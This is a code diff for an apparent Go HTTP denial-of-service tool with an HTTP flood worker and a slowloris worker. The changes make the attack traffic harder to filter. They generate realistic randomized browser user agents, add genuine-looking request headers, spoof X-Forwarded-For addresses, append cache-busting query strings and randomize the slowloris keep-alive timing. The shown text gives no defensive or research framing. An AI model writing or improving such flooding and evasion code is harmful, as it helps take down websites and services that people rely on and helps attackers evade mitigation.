@@ -21,9 +21,7 @@ var (
 	timer         int
 	customHost    string
 	httpMethods   = []string{"GET", "HEAD", "POST"}
-	userAgents    = []string{"Mozilla/5.0", "AppleWebKit/537.36", "Chrome/91.0", "Safari/537.36"}
-	platforms     = []string{"Macintosh", "Windows", "Linux", "Android", "iPhone"}
-	slowlorisRate = 0.4 // float64 type
+	slowlorisRate = 0.4
 )
 
 func init() {
@@ -48,7 +46,64 @@ func resolveDNS(hostname string) {
 }
 
 func randomUserAgent() string {
-	return userAgents[rand.Intn(len(userAgents))] + " " + platforms[rand.Intn(len(platforms))]
+	browserVersions := map[string]string{
+		"Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
+		"Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
+		"Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
+		"Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
+	}
+
+	osInfo := map[string]string{
+		"Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
+		"Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
+		"Linux":     "X11; Linux x86_64",
+		"Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
+		"iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
+		"iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
+	}
+
+	devices := []struct {
+		typeName string
+		models   []string
+	}{
+		{"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
+		{"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
+		{"Desktop", []string{"", "", "", ""}}, // Empty for desktop
+	}
+
+	// Select random device type
+	deviceType := devices[rand.Intn(len(devices))]
+	model := ""
+	if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
+		model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
+	}
+
+	// Select random OS
+	var osKeys []string
+	for k := range osInfo {
+		osKeys = append(osKeys, k)
+	}
+	selectedOS := osKeys[rand.Intn(len(osKeys))]
+
+	// Select random browser
+	var browserKeys []string
+	for k := range browserVersions {
+		browserKeys = append(browserKeys, k)
+	}
+	selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]
+
+	return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
+		model,
+		osInfo[selectedOS],
+		func() string {
+			if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
+				return " Mobile"
+			}
+			return ""
+		}(),
+		selectedBrowser,
+		browserVersions[selectedBrowser],
+	)
 }
 
 func buildRequest(method, path string) []byte {
@@ -57,14 +112,16 @@ func buildRequest(method, path string) []byte {
 		host = ip
 	}
 
-	// Randomize header order and content
 	headers := []string{
 		fmt.Sprintf("Host: %s", host),
 		fmt.Sprintf("User-Agent: %s", randomUserAgent()),
-		"Accept: */*",
-		"Accept-Encoding: gzip, deflate",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+		"Accept-Language: en-US,en;q=0.5",
+		"Accept-Encoding: gzip, deflate, br",
 		fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
-		"Cache-Control: no-cache",
+		"Connection: keep-alive",
+		"Cache-Control: max-age=0",
+		"Upgrade-Insecure-Requests: 1",
 	}
 
 	if method == "POST" {
@@ -73,16 +130,17 @@ func buildRequest(method, path string) []byte {
 			"Content-Type: application/x-www-form-urlencoded",
 			fmt.Sprintf("Content-Length: %d", len(data)),
 		)
-		rand.Shuffle(len(headers), func(i, j int) {
-			headers[i], headers[j] = headers[j], headers[i]
-		})
-		return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
-			method, path, joinHeaders(headers), data))
 	}
 
 	rand.Shuffle(len(headers), func(i, j int) {
 		headers[i], headers[j] = headers[j], headers[i]
 	})
+
+	path += fmt.Sprintf("?cache_bust=%d", rand.Intn(1000000))
+	if rand.Intn(2) == 0 {
+		path += fmt.Sprintf("&rand=%d", rand.Intn(1000000))
+	}
+
 	return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
 		method, path, joinHeaders(headers)))
 }
@@ -112,13 +170,9 @@ func floodWorker(id int, stop <-chan struct{}) {
 				continue
 			}
 
-			for i := 0; i < rand.Intn(100)+100; i++ { // 100-200 requests/connection
+			for i := 0; i < rand.Intn(100)+100; i++ {
 				method := httpMethods[rand.Intn(len(httpMethods))]
-				reqPath := path
-				if rand.Intn(2) == 0 {
-					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
-				}
-				conn.Write(buildRequest(method, reqPath))
+				conn.Write(buildRequest(method, path))
 			}
 			conn.Close()
 		}
@@ -143,13 +197,12 @@ func slowlorisWorker(id int, stop <-chan struct{}) {
 				path, rand.Intn(10000), ip)
 			conn.Write([]byte(partial))
 
-			// Keep connection alive with partial headers
 			for i := 0; i < 10; i++ {
 				select {
 				case <-stop:
 					conn.Close()
 					return
-				case <-time.After(time.Second * 5):
+				case <-time.After(time.Second * time.Duration(rand.Intn(5)+1)):
 					conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
 				}
 			}
@@ -203,7 +256,6 @@ func main() {
 	stop := make(chan struct{})
 	var wg sync.WaitGroup
 
-	// Start workers
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -216,7 +268,6 @@ func main() {
 		}(i)
 	}
 
-	// Run for specified duration
 	time.Sleep(time.Duration(timer) * time.Second)
 	close(stop)
 	wg.Wait()
